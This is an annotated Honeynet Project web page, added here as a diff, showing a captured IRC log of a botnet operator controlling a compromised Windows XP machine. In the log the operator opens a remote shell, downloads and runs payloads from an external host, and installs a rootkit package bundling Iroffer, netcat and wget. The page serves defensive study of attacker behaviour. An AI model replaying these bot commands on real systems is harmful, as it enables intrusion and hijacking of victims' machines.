@@ -1,0 +1,146 @@
+<!-- $Id: botnet-iroffer.html 786 2005-02-27 22:36:04Z tho $ -->
+<?xml version="1.0" encoding="iso-8859-1"?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.1//EN" "http://www.w3.org/TR/xhtml11/DTD/xhtml11.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
+    <meta name="description" content="Tracking Botnets with help of Honeynets" />
+    <meta name="keywords" content="hacking,security,honeypots,honeynets,Honeynet Project,botnets,bots" />
+    <title>Know your Enemy: Tracking Botnets</title>
+    <link rel="stylesheet" type="text/css" href="botnets.css" />
+  </head>
+<body>
+
+<div id="header">
+<h1>Know your Enemy:<br /> Tracking Botnets - Chatlog</h1>
+<h3 id="subtitle">Watching attackers at their work</h3>
+<p id="metainfo">
+  <a href="mailto:project@honeynet.org?Subject=Know Your Enemy">Honeynet Project</a><br />
+  <a href="http://www.honeynet.org">http://www.honeynet.org</a><br />
+  Last Modified: 26 February, 2005
+</p>
+</div>
+
+<p>The following text is a capture of a session in which the attacker issued
+some commands. It shows how an attacker logs into a victim host and
+installs a rootkit on it. We  added comments (marked in <span class="comment">red</span>)
+to help better explain the activity. </p>
+
+<pre>
+Feb 19 13:33:41  <~foobar>        .scarica http://www.s0ngavezz0.altervista.org/bind.dll c:\sonofigo.dll 2
+<span class="comment">// instruct the bot to download the specified file (Note: URL is obfuscated)</span>
+Feb 19 13:33:59  < FRA|XXXXXX>   [DOWNLOAD]: D0S Downloaded 3422.8 KB in c:\sonofigo.dll @ 201.3 KB/sec.
+<span class="comment">// 201.3 KB/sec - so the machines seems to have a fast Internet connection</span>
+Feb 19 13:35:06  <~foobar>        .logout
+<span class="comment">// command to logout the master...</span>
+Feb 19 13:35:06  < FRA|XXXXXX>   [r0x]: User foobar logged out.
+Feb 19 13:36:16  <~foobar>        FRA|XXXXXX .login toldo
+<span class="comment">// ... but he decides to login about one minute later</span>
+Feb 19 13:36:17  < FRA|XXXXXX>   [r[X]-Sh0[x]]: .:( Password Accettata ):. .
+Feb 19 13:36:23  <~foobar>        .opencmd
+<span class="comment">// open a command shell on this bot</span>
+Feb 19 13:36:24  < FRA|XXXXXX>   [CMD]: Remote shell ready.
+Feb 19 13:36:25  < FRA|XXXXXX>   Microsoft Windows XP [version 5.1.2600]
+Feb 19 13:36:25  < FRA|XXXXXX>   (C) Copyright 1985-2001 Microsoft Corp.
+Feb 19 13:36:27  < FRA|XXXXXX>   C:\Documents and Settings\KiM>
+Feb 19 13:36:35  <~foobar>        .logout
+<span class="comment">// logout </span>
+Feb 19 13:36:35  < FRA|XXXXXX>   [r0x]: User foobar logged out.
+Feb 19 13:36:40  <~foobar>        FRA|XXXXXX .login toldo
+<span class="comment">// and login again </span>
+Feb 19 13:36:40  < FRA|XXXXXX>   [r[X]-Sh0[x]]: .:( Password Accettata ):. .
+Feb 19 13:36:41  <~foobar>        .opencmd
+Feb 19 13:36:42  < FRA|XXXXXX>   [CMD]: Remote shell already running.
+Feb 19 13:36:54  <~foobar>        .cmd mkdir c:\windows\system32\kernel
+<span class="comment">// he issues some commands to create a directory, change to this directory and list its contents</span>
+Feb 19 13:36:55  < FRA|XXXXXX>   mkdir c:\windows\system32\kernel
+Feb 19 13:36:56  < FRA|XXXXXX>   C:\Documents and Settings\KiM>
+Feb 19 13:37:00  <~foobar>        .cmd cd c:\windows\system32\kernel
+Feb 19 13:37:01  < FRA|XXXXXX>   cd c:\windows\system32\kernel
+Feb 19 13:37:02  <~foobar>        .cmd dir
+Feb 19 13:37:03  < FRA|XXXXXX>   C:\WINDOWS\system32\kernel>dir
+Feb 19 13:37:04  < FRA|XXXXXX>    Le volume dans le lecteur C n'a pas de nom.
+Feb 19 13:37:05  < FRA|XXXXXX>    Le numro de srie du volume est A443-2CAF
+Feb 19 13:37:07  < FRA|XXXXXX>    Rpertoire de C:\WINDOWS\system32\kernel
+Feb 19 13:37:09  < FRA|XXXXXX>   19/02/2005  13:37    <REP>          .
+Feb 19 13:37:10  < FRA|XXXXXX>   19/02/2005  13:37    <REP>          ..
+Feb 19 13:37:11  < FRA|XXXXXX>                  0 fichier(s)                0 octets
+Feb 19 13:37:13  < FRA|XXXXXX>                  2 Rp(s)   8ÿ990ÿ302ÿ208 octets libres
+Feb 19 13:37:14  < FRA|XXXXXX>   C:\WINDOWS\system32\kernel>
+Feb 19 13:38:25  <~foobar>        .scarica http://www.s0ngavezz0.altervista.org/USBdrive.exe c:\windows\system32\kernel\USBdrive.exe 2
+<span class="comment">// download the specified file (Note: URL is obfuscated again)</span>
+Feb 19 13:38:26  < FRA|XXXXXX>   .:(DoWnLoAd):.: Downloading URL: http://www.s0ngavezz0.altervista.org/USBdrive.exe to: c:\windows\system32\kernel\USBdrive.exe.
+Feb 19 13:38:30  < FRA|XXXXXX>   [DOWNLOAD]: D0S Downloaded 990.6 KB in c:\windows\system32\kernel\USBdrive.exe @ 198.1 KB/sec.
+Feb 19 13:38:46  <~foobar>        .cmd usbdrive.exe
+Feb 19 13:38:47  < FRA|XXXXXX>   usbdrive.exe
+Feb 19 13:38:49  < FRA|XXXXXX>   C:\WINDOWS\system32\kernel>
+Feb 19 13:39:10  <~foobar>        .scarica http://www.s0ngavezz0.altervista.org/USBdrive.exe c:\windows\system32\kernel\USBdrive.exe 1
+Feb 19 13:39:11  < FRA|XXXXXX>   [DOWNLOAD]: D0S Downloaded 990.6 KB in c:\windows\system32\kernel\USBdrive.exe @ 990.6 KB/sec.
+Feb 19 13:39:11  < FRA|XXXXXX>   .:(DoWnLoAd):.: Downloading URL: http://www.s0ngavezz0.altervista.org/USBdrive.exe to: c:\windows\system32\kernel\USBdrive.exe.
+Feb 19 13:39:11  < FRA|XXXXXX>   [DOWNLOAD]: Apro Il File : c:\windows\system32\kernel\USBdrive.exe.
+Feb 19 13:39:45  <~foobar>        .scarica http://www.s0ngavezz0.altervista.org/maxi.exe c:\windows\system32\kernel\maxi.exe 2
+Feb 19 13:39:45  < FRA|XXXXXX>   .:(DoWnLoAd):.: Downloading URL: http://www.s0ngavezz0.altervista.org/maxi.exe to: c:\windows\system32\kernel\maxi.exe.
+Feb 19 13:39:57  < FRA|XXXXXX>   [DOWNLOAD]: D0S Downloaded 2830.7 KB in c:\windows\system32\kernel\maxi.exe @ 257.3 KB/sec.
+Feb 19 13:40:28  <~foobar>        .cmd maxi.exe "MaX|Dav|test00
+Feb 19 13:40:29  < FRA|XXXXXX>   maxi.exe "MaX|Dav|test00
+Feb 19 13:40:31  < FRA|XXXXXX>   ===================================================
+Feb 19 13:40:32  < FRA|XXXXXX>      Piu' le cose cambiano, piu' restano le stesse
+Feb 19 13:40:33  < FRA|XXXXXX>
+Feb 19 13:40:34  < FRA|XXXXXX>                    r00tKit Maker 2.0
+Feb 19 13:40:35  < FRA|XXXXXX>   ===================================================
+Feb 19 13:40:37  < FRA|XXXXXX>   ..::[+] Analisi del file
+Feb 19 13:40:38  < FRA|XXXXXX>   ..::[+] L'archivio contiene i files essenziali
+Feb 19 13:40:39  < FRA|XXXXXX>   ..::[+] L'archivio contiene Iroffer
+Feb 19 13:40:40  < FRA|XXXXXX>   ..::[+] L'archivio contiene 8 tools
+Feb 19 13:40:41  < FRA|XXXXXX>   ..::[+] Analisi completata
+Feb 19 13:40:42  < FRA|XXXXXX>   ..::[-]
+Feb 19 13:40:43  < FRA|XXXXXX>   ..::[+] Inizio unpacking
+Feb 19 13:40:44  < FRA|XXXXXX>   ..::[-]
+Feb 19 13:40:45  < FRA|XXXXXX>   ..::[+] ESTRAZIONE IN CORSO DI: Files Essenziali
+Feb 19 13:40:47  < FRA|XXXXXX>   ..::[+] Estraggo: cygwin1.dll
+Feb 19 13:40:47  < FRA|XXXXXX>   ..::[+] Estraggo: firedaemon.exe
+Feb 19 13:40:48  < FRA|XXXXXX>   ..::[+] Estraggo: cmd.exe
+Feb 19 13:40:49  < FRA|XXXXXX>   ..::[-]
+Feb 19 13:40:50  < FRA|XXXXXX>   ..::[+] ESTRAZIONE IN CORSO DI: Iroffer
+Feb 19 13:40:51  < FRA|XXXXXX>   ..::[+] Estraggo: MSServ.exe
+Feb 19 13:40:52  < FRA|XXXXXX>   ..::[+] Estraggo: cygcrypt-0.dll
+Feb 19 13:40:53  < FRA|XXXXXX>   ..::[+] Estraggo: convertxdccfile.exe
+Feb 19 13:40:54  < FRA|XXXXXX>   ..::[+] Estraggo: System.dll
+Feb 19 13:40:55  < FRA|XXXXXX>   ..::[-]
+Feb 19 13:40:56  < FRA|XXXXXX>   ..::[+] ESTRAZIONE IN CORSO DI: Files Aggiuntivi
+Feb 19 13:40:57  < FRA|XXXXXX>   ..::[+] Estraggo: netcat.exe
+Feb 19 13:40:58  < FRA|XXXXXX>   ..::[+] Estraggo: pkunzip.exe
+Feb 19 13:40:59  < FRA|XXXXXX>   ..::[+] Estraggo: uptime.exe
+Feb 19 13:41:00  < FRA|XXXXXX>   ..::[+] Estraggo: psinfo.exe
+Feb 19 13:41:01  < FRA|XXXXXX>   ..::[+] Estraggo: pslist.exe
+Feb 19 13:41:02  < FRA|XXXXXX>   ..::[+] Estraggo: kill.exe
+Feb 19 13:41:03  < FRA|XXXXXX>   ..::[+] Estraggo: unrar.exe
+Feb 19 13:41:04  < FRA|XXXXXX>   ..::[+] Estraggo: wget.exe
+Feb 19 13:41:05  < FRA|XXXXXX>   ..::[+] Scompattazione completata
+Feb 19 13:41:06  < FRA|XXXXXX>   ..::[-]
+Feb 19 13:41:07  < FRA|XXXXXX>   ..::[+] Uploads e Conf NON sono separati
+Feb 19 13:41:08  < FRA|XXXXXX>   ..::[+] Nickname: MaX|Dav|test00
+Feb 19 13:41:09  < FRA|XXXXXX>   ..::[+] Modifica conf completata
+Feb 19 13:41:10  < FRA|XXXXXX>   ..::[+] Avvio Iroffer in corso
+Feb 19 13:41:11  < FRA|XXXXXX>   ..::[+] Iroffer Avviato
+Feb 19 13:41:12  < FRA|XXXXXX>   ..::[-]
+Feb 19 13:41:14  < FRA|XXXXXX>   ===================================================
+Feb 19 13:41:15  < FRA|XXXXXX>                    Coded by Expanders
+Feb 19 13:41:16  < FRA|XXXXXX>   ===================================================
+Feb 19 13:41:19  < FRA|XXXXXX>   C:\WINDOWS\system32\kernel>
+Feb 19 13:41:20  <~foobar>        .uptime
+<span class="comment">// check uptime of compromised system</span>
+Feb 19 13:41:20  < FRA|XXXXXX>   [r0x]: Uptime: 0d 0h 22m.
+Feb 19 13:41:43  <~foobar>        .logout
+<span class="comment">// finally log out from this bot</span>
+Feb 19 13:41:44  < FRA|XXXXXX>   [r0x]: User foobar logged out.
+Feb 19 13:41:49  <~foobar>        FRA|YYYYYY .login toldo
+<span class="comment">// ... and login to another box</span>
+</pre>
+
+<div id="footer">
+  <a href="http://www.honeynet.org"><img src="http://www.honeynet.org/images/small.gif" alt="The Honeynet Project" /></a>
+</div>
+
+</body>
+</html>
